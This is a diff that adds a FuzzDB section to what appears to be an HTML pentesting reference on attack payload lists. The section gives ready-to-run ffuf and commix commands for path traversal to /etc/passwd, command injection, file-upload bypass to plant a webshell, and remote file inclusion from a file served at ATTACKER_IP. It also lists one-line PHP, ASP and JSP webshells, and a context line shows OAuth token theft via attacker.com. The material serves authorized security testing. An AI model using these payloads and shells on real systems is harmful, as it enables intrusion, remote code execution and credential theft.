@@ -712,6 +712,104 @@ ffuf -u "https://target.com/redirect?url=FUZZ" \
 # https://target.com/oauth/authorize?client_id=X&redirect_uri=https://target.com/redirect?url=https://attacker.com&response_type=token
 # 3. Victim clicks link → OAuth token in fragment → attacker.com captures it</code></pre>
 
+  <h2>FuzzDB — Attack Payload Database</h2>
+  <p>FuzzDB is one of the original attack payload databases, predating SecLists. It covers OS command injection, path traversal, file upload bypass, RFI, web backdoors, and format strings. Many SecLists entries were sourced from FuzzDB. Install: <code>git clone https://github.com/fuzzdb-project/fuzzdb</code>. Standard reference path: <code>/opt/fuzzdb/</code>.</p>
+
+  <table>
+    <tr><th>Attack Category</th><th>FuzzDB Path</th><th>Key List</th><th>Size</th></tr>
+    <tr><td>SQL Injection (detect)</td><td>attack-payloads/sql-injection/detect/</td><td>GenericBlind.fuzzdb.txt</td><td>~42</td></tr>
+    <tr><td>SQL Injection (exploit)</td><td>attack-payloads/sql-injection/exploit/</td><td>MySQL.fuzzdb.txt</td><td>~6</td></tr>
+    <tr><td>XSS</td><td>attack-payloads/xss/</td><td>rsnake.txt</td><td>77</td></tr>
+    <tr><td>OS Command Injection</td><td>attack-payloads/os-cmd-execution/</td><td>reverse-shell-one-liners.doc.txt</td><td>~30</td></tr>
+    <tr><td>Path Traversal</td><td>attack-payloads/path-traversal/</td><td>traversals-8-deep-exotic-encoding.txt</td><td>882</td></tr>
+    <tr><td>Remote File Inclusion</td><td>attack-payloads/rfi/</td><td>rfi.txt</td><td>2246</td></tr>
+    <tr><td>File Upload Bypass</td><td>attack-payloads/file-upload/</td><td>alt-extensions-php.txt</td><td>60</td></tr>
+    <tr><td>LDAP Injection</td><td>attack-payloads/ldap/</td><td>ldap-injections.fuzzdb.txt</td><td>~17</td></tr>
+    <tr><td>XPath Injection</td><td>attack-payloads/xpath/</td><td>xpath-injection.fuzzdb.txt</td><td>~28</td></tr>
+    <tr><td>XXE</td><td>attack-payloads/xml/</td><td>xml-attacks.fuzzdb.txt</td><td>~11</td></tr>
+    <tr><td>Format Strings</td><td>attack-payloads/format-strings/</td><td>format-strings.fuzzdb.txt</td><td>~14</td></tr>
+    <tr><td>Integer Overflow</td><td>attack-payloads/integer-overflow/</td><td>integer-overflow.fuzzdb.txt</td><td>~8</td></tr>
+    <tr><td>Web Backdoors (PHP)</td><td>web-backdoors/php/</td><td>multiple one-liners + shells</td><td>—</td></tr>
+    <tr><td>Web Backdoors (ASP)</td><td>web-backdoors/asp/</td><td>cmd.asp, cmdasp.asp</td><td>—</td></tr>
+    <tr><td>DNS Bruteforce</td><td>discovery/DNS/</td><td>subdomains-top1mil.txt</td><td>varies</td></tr>
+    <tr><td>File/Dir Bruteforce</td><td>discovery/FilenameBruteforce/</td><td>raft-large-directories.txt</td><td>varies</td></tr>
+  </table>
+
+  <h3>Path Traversal — Exotic Encoding List</h3>
+  <pre><code># FuzzDB's traversals-8-deep-exotic-encoding.txt covers 882 variations:
+# Standard traversals, URL encoding, double encoding, Unicode, UTF-8 overlong sequences
+# 8 directory levels deep (../../../../../../../../etc/passwd)
+
+# Use with ffuf:
+ffuf -u "https://target/download?file=FUZZ" \
+  -w /opt/fuzzdb/attack-payloads/path-traversal/traversals-8-deep-exotic-encoding.txt \
+  -mc 200 -mr "root:" -v
+
+# Or with Burp Intruder: paste list into payload set, position on file parameter</code></pre>
+
+  <h3>OS Command Injection — Reverse Shells</h3>
+  <pre><code># reverse-shell-one-liners.doc.txt contains platform-specific one-liners:
+# Bash, Python, Perl, PHP, Ruby, nc (with/without -e), Java, PowerShell, etc.
+
+# Use with commix (auto command injection tool):
+commix --url "https://target/ping?host=FUZZ" --level 3
+
+# Manual with ffuf — detect command injection via time delay:
+ffuf -u "https://target/ping?host=FUZZ" \
+  -w /opt/fuzzdb/attack-payloads/os-cmd-execution/command-injection-template.fuzzdb.txt \
+  -mc 200 -t 1  # single-threaded for accurate timing</code></pre>
+
+  <h3>File Upload Bypass — PHP Extension List</h3>
+  <pre><code># alt-extensions-php.txt — 60 alternate PHP extensions that may execute:
+# .php, .php3, .php4, .php5, .php6, .php7, .phtml, .pHp, .PHP,
+# .phps, .phpt, .phar, .pgif, .shtml, .htaccess, .inc, etc.
+
+# Upload bypass workflow:
+# 1. Upload webshell.php — blocked by MIME/extension check
+# 2. Iterate through alt-extensions-php.txt:
+ffuf -u "https://target/upload" \
+  -X POST \
+  -F "file=@shell.phpFUZZ;type=image/jpeg" \
+  -w /opt/fuzzdb/attack-payloads/file-upload/alt-extensions-php.txt \
+  -mc 200 -mr "success|uploaded" -v
+
+# 3. Once accepted extension found, request the file to execute the shell</code></pre>
+
+  <h3>RFI Payloads</h3>
+  <pre><code># rfi.txt — 2246 RFI payloads covering:
+# Null bytes, protocol wrappers (php://, data://, zip://, expect://)
+# Double encoding, path normalization bypass
+
+# Test for RFI:
+ffuf -u "https://target/page?include=FUZZ" \
+  -w /opt/fuzzdb/attack-payloads/rfi/rfi.txt \
+  -mc 200 -mr "RFI_MARKER"  # put a marker in your hosted file
+
+# Host a test file:
+echo "&lt;?php echo 'RFI_MARKER'; ?&gt;" &gt; /tmp/rfi_test.php
+python3 -m http.server 8080 --directory /tmp/
+
+# Then replace FUZZ targets with http://ATTACKER_IP:8080/rfi_test.php</code></pre>
+
+  <h3>Web Backdoors Reference</h3>
+  <pre><code># FuzzDB web-backdoors/ directory — ready-to-upload shells:
+# PHP one-liners:
+#   &lt;?php system($_GET["cmd"]); ?&gt;
+#   &lt;?php passthru($_GET["cmd"]); ?&gt;
+#   &lt;?=`$_GET[0]`?&gt;      (short tag, executes via backtick)
+#   &lt;script language="php"&gt;system($_GET['c']);&lt;/script&gt;  (bypass &lt;?php filter)
+#
+# ASP one-liners (web-backdoors/asp/):
+#   &lt;% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c "&amp;Request("cmd")).StdOut.ReadAll()) %&gt;
+#
+# JSP (web-backdoors/jsp/):
+#   &lt;%Runtime.getRuntime().exec(request.getParameter("cmd"));%&gt;
+#
+# ASP.NET (web-backdoors/aspx/):
+#   &lt;%@ Page Language="C#"%&gt;&lt;%Response.Write(new System.Diagnostics.Process()...%&gt;
+
+# IMPORTANT: Only upload to systems you own or have written authorization to test.</code></pre>
+
   <h2>Workflow: Choosing the Right Payload List</h2>
   <pre><code># Decision tree for payload selection:
 #
